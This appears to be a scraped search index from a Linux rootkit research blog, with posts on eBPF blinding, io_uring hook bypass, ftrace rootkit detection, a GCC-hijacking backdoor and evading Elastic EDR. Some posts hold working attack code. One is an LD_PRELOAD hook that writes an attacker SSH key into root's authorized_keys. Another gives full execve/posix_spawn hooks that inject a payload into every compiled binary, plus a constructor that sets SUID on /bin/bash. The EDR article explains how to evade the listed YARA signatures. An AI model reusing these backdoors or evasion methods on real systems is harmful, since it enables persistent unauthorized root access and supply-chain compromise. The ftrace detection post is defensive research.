(@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) 